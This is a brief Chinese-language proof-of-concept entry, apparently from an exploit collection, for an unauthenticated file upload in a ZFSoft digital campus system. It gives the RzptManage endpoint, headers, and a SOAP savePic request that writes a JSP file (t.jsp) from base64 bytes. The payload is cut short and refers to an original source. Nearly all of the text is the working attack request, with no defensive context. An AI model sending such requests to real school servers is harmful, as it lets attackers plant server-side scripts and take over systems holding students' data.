# 数字化校园系统-RzptManage-文件上传

- **系统**：数字化校园系统　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /zfca/axis/RzptManage HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 793`

**请求体 / payload**
```
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com">
<soapenv:Header/>
<soapenv:Body>
<pub:savePic soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">t.jsp</filepath>
<bytes xsi:type="soapenc:base64Binary" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">PCUgb3V0LnByaW50bG4oMTIzKTtuZXcgamF2YS5pby5Ga…（脚本共 760 字，完整版见原文）
```
- **预期**：200　|　—